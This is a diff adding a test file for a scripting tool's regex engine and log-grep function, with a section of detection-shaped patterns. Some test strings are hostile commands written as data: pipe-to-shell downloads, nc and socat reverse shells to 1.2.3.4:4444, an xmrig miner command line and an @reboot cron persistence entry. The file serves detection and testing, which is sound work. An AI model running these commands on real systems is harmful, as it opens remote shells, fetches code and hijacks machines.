@@ -1,0 +1,161 @@
+# Pattern matching (`re.*`) and log searching (`fs.grep`).
+#
+# The engine is JOCKY's own: a Thompson/Pike NFA whose cost is
+# O(len(text) * len(pattern)) no matter how the pattern is shaped. The case
+# that matters here is the *adversarial* one — `/proc/self/status` and the
+# literal strings below are the only host inputs, so this file is portable.
+#
+# Patterns are written as raw strings (`r"…"`): no escape decoding, no
+# interpolation, so `r"^\d{2}:\d{2}$"` is the pattern and nothing else.
+
+# --- literals and anchors --------------------------------------------------
+expect(re.test(r"bin", "/usr/sbin/sshd"), true, "an unanchored literal matches inside a string")
+expect(re.test(r"sshd", "/usr/sbin/sshd"), true, "the match may be a suffix")
+expect(re.test(r"^sshd", "/usr/sbin/sshd"), false, "^ anchors to the very start")
+expect(re.test(r"^/usr", "/usr/sbin/sshd"), true, "^ matches at position 0")
+expect(re.test(r"sshd$", "/usr/sbin/sshd"), true, "$ anchors to the end")
+expect(re.test(r"sshd$", "/usr/sbin/sshd -D"), false, "$ does not match mid-string")
+expect(re.test(r"^$", ""), true, "an empty text has both anchors")
+expect(re.full(r"\d+", "4242"), true, "full() requires the whole text to match")
+expect(re.full(r"\d+", "4242x"), false, "full() rejects trailing text")
+
+# --- raw strings -----------------------------------------------------------
+expect(re.test(r"^\d{2}:\d{2}$", "13:45"), true, "raw-string braces reach the engine as a quantifier")
+expect(r"\d" == "\\d", true, "raw and escaped text agree where they overlap")
+expect(len(r"\d+"), 3, "a raw string is counted verbatim")
+expect(len(r"a{2,4}"), 6, "braces are counted, not interpreted, inside a raw string")
+expect(r"{1+1}", "\{1+1\}", "a raw string does not interpolate")
+expect("n={7}", "n=7", "interpolation still works in a normal string")
+
+# --- classes ---------------------------------------------------------------
+expect(re.test(r"^[0-9]+$", "1337"), true, "a range class matches digits")
+expect(re.test(r"^[0-9]+$", "13a7"), false, "a range class rejects other characters")
+expect(re.test(r"[^/]*$", "/etc/shadow"), true, "a negated class matches anything else")
+expect(re.test(r"^[^/]+$", "/etc"), false, "a negated class must not match its excluded character")
+expect(re.test(r"\d{2}:\d{2}", "at 13:45 sharp"), true, "d is a digit class")
+expect(re.test(r"\s+", "a b"), true, "s is a whitespace class")
+expect(re.test(r"\w+-\w+", "pid-1234"), true, "w is a word class")
+
+# --- quantifiers -----------------------------------------------------------
+expect(re.test(r"^a+b$", "aaab"), true, "+ requires at least one")
+expect(re.test(r"^b+a$", "ab"), false, "+ is not optional")
+expect(re.test(r"^ab?c$", "ac"), true, "? makes the previous atom optional")
+expect(re.test(r"^a{2,3}b$", "aab"), true, "bounded repetition at its lower bound")
+expect(re.test(r"^a{2,3}b$", "aaab"), true, "bounded repetition inside its range")
+expect(re.test(r"^a{2,3}b$", "aaaab"), false, "bounded repetition above its range")
+expect(re.test(r"^a*c$", "c"), true, "* allows zero occurrences")
+expect(re.test(r"^(?:ab)+c$", "ababc"), true, "a non-capturing group can be repeated")
+expect(re.test(r"colou?r", "the colour is red"), true, "a real-world optional letter")
+
+# --- alternation, captures and replacement ---------------------------------
+expect(re.test(r"(curl|wget)[^|]*\|\s*(ba)?sh", "curl http://x | sh"), true,
+       "the classic pipe-to-shell shape")
+expect(re.test(r"(curl|wget)[^|]*\|\s*(ba)?sh", "curl http://x > /tmp/x"), false,
+       "a download without a pipe is not the shape")
+expect(re.captures(r"(\w+)=(\w+)", "pid=42 ppid=7"),
+       [["pid=42", "pid", "42"], ["ppid=7", "ppid", "7"]],
+       "captures() returns the whole match followed by the groups")
+expect(re.captures(r"(\w+)@(\w+)", "no address here"), [],
+       "captures() is empty when nothing matches")
+expect(re.replace(r"p(\d+)", "p1 p2", "[$1]"), "[1] [2]", "$1 expands to the first group")
+expect(re.replace(r"\d+", "a1b22c333", "#"), "a#b#c#", "replace() rewrites every match")
+expect(re.replace(r"\d+", "a1b22c333", "#", 1), "a#b22c333", "the limit caps the rewrites")
+expect(re.split(r"\s*,\s*", "a , b,c"), ["a", "b", "c"], "split() trims around the separator")
+expect(re.split(r"\d+", "a1b2c"), ["a", "b", "c"], "split() cuts on digit runs")
+
+# --- boundaries ------------------------------------------------------------
+# Regression: `char in _WORD` is true for the empty string, so the boundary test
+# used to think position 0 had a word character before it.
+expect(re.test(r"\bnc\b", "nc -e /bin/sh 1.2.3.4 4444"), true,
+       "a word boundary matches at the very start of the text")
+expect(re.test(r"\bword\b", "a word here"), true, "boundaries bracket a standalone word")
+expect(re.test(r"\bword\b", "swordfish"), false, "boundaries reject a word inside a word")
+expect(re.test(r"\bnc\b", "nc"), true, "boundaries match when the word is the whole text")
+expect(re.test(r"^\bfoo", "foo"), true, "a boundary composes with ^")
+expect(re.test(r"bar\b$", "bar"), true, "a boundary composes with $")
+
+# --- flags and escaping ----------------------------------------------------
+expect(re.test(r"failed", "FAILED login"), false, "matching is case-sensitive by default")
+expect(re.test(r"failed", "FAILED login", true), true, "the third argument ignores case")
+expect(re.test(r"^LOGOUT$", "logout", true), true, "ignore-case covers anchors and literals")
+expect(re.escape("a.b*c"), "a\\.b\\*c", "escape() quotes every special character")
+expect(re.test(re.escape("1.2.3.4"), "from 1.2.3.4 port 22"), true,
+       "an escaped address matches literally")
+expect(re.test(r"^1.2.3.4$", "1x2x3x4"), true, "unescaped dots are wildcards (why escape matters)")
+
+# --- matching semantics ----------------------------------------------------
+# Matching is leftmost-longest, not Perl's leftmost-first: for a forensic
+# verdict ("does this text contain the shape?") that is the predictable rule.
+expect(re.find(r"a|ab", "ab", 1)[0]["text"], "ab", "alternation prefers the longest match")
+expect(re.find(r"\d+", "a1 b22 c333")[1]["text"], "22", "find() returns matches left to right")
+expect(len(re.find(r"\d+", "a1 b22 c333", 2)), 2, "the limit caps how many matches come back")
+expect(re.find(r"\d+", "none here"), [], "find() is empty when nothing matches")
+
+# --- limits and errors -----------------------------------------------------
+expect(re.test(r"(a+)+b", "a" * 200), false,
+       "a nested quantifier answers in linear time instead of hanging")
+expect_throws(fn() { re.test("(a", "abc") }, "an unclosed group is an error", "unterminated group")
+expect_throws(fn() { re.test("[abc", "abc") }, "an unclosed class is an error", "unterminated character class")
+expect_throws(fn() { re.test(r"abc\", "abc") }, "a trailing backslash is an error", "trailing backslash")
+expect_throws(fn() { re.test("a*?", "aa") }, "lazy quantifiers are unsupported", "lazy")
+expect_throws(fn() { re.test(r"a{3,2}", "aaa") }, "an inverted range is an error", "inverted")
+
+# --- detection-shaped patterns ---------------------------------------------
+let crypto_miner = "xmrig --donate-level 1 -o pool.minexmr.com:4444 -u wallet"
+expect(re.test(r"(xmrig|minerd|cpuminer|kdevtmpfsi)", crypto_miner), true,
+       "a miner binary shows up in its command line")
+expect(re.test(r"stratum\+tcp://", "xmrig -o stratum+tcp://pool:3333"), true,
+       "a stratum URL is a strong miner indicator")
+expect(re.test(r"/dev/shm/\.[a-z0-9]{8,}", "exec /dev/shm/.a1b2c3d4e5f6"), true,
+       "a hidden dotfile binary in shared memory")
+expect(re.test(r"(curl|wget)[^|]*\|\s*(ba)?sh", "wget -qO- http://x/y|bash"), true,
+       "pipe-to-shell without spaces around the pipe")
+expect(re.test(r"^@reboot\s+", "@reboot /tmp/.x"), true, "an @reboot cron entry")
+expect(re.test(r"(base64\s+-d|echo\s+[A-Za-z0-9+/=]{40,})", "echo " + "QUJD" * 12), true,
+       "a long base64 blob on a command line")
+expect(re.test(r"(^|\s)(nc|ncat|socat)\s", "  socat TCP:1.2.3.4:4444 EXEC:sh"), true,
+       "a shell-out listener")
+
+# --- log searching ---------------------------------------------------------
+# /proc/self/status always exists on Linux and always has these keys.
+let fields = fs.grep("/proc/self/status", r"^(Name|State|Threads):\s+(\S+)", 10)
+assert(len(fields) >= 3, "grep finds the stable keys of the running process")
+assert(fields[0]["line_no"] >= 1, "the first hit records its one-based line number")
+assert(fields[0]["groups"][0] == "Name", "the first group captures the key")
+assert(len(fields[0]["line"]) > 0, "the whole matched line comes back")
+
+let capped = fs.grep("/proc/self/status", r"^\w+:", 2)
+expect(len(capped), 2, "the limit caps how many lines come back")
+
+let missed = fs.grep("/proc/self/status", r"this-key-does-not-exist")
+expect(missed, [], "a pattern that matches nothing returns an empty list")
+
+expect_throws(fn() { fs.grep("/nonexistent/path/for/sure", "x") },
+              "grepping a missing file is an error", "cannot read")
+
+# A pattern that must contain a literal backslash-n matches a real newline.
+expect(re.test(r"a\nb", "a\nb"), true, "the engine decodes \n in a pattern")
+expect(re.test(r"a\nb", "ab"), false, "and it is not the same as no separator")
+
+# Unicode text flows through untouched.
+expect(re.test(r"café", "un café noir"), true, "non-ASCII literals match")
+expect(re.captures(r"(\w+)", "café")[0][1], "caf", "word classes stay ASCII (documented)")
+
+# --- byte patterns ---------------------------------------------------------
+# `fs.read_bytes` returns a latin-1 byte string (one character per byte), so a
+# signature is written with a hex escape and matches a value read from disk.
+let head = fs.read_bytes("/proc/self/exe", 0, 4)
+expect(head[0], "\x7f", "the first byte of an ELF image is 0x7f")
+expect(re.test(r"^\x7fELF", head), true, "r\"\\x7fELF\" matches those bytes")
+expect(re.test(r"[\x00-\x1f]", head), false, "the printable header is outside the control range")
+expect(re.test(r"\x7f", "\x7f"), true, "a hex escape matches the code point it names")
+expect(re.test(r"[\x41-\x5a]+", "ABC"), true, "hex escapes work at both ends of a range")
+expect_throws(fn() { re.test(r"\q", "q") }, "an unknown letter escape is an error",
+              "unsupported escape")
+expect_throws(fn() { re.test(r"\x", "x") }, "a short hex escape is an error", "two hex digits")
+
+# Degenerate inputs must not raise.
+expect(re.test(r"", "anything"), true, "an empty pattern matches anywhere")
+expect(re.test(r"", ""), true, "an empty pattern matches empty text")
+expect(re.find(r"", ""), [{"text": "", "start": 0, "end": 0, "groups": []}],
+       "an empty pattern yields one empty match")
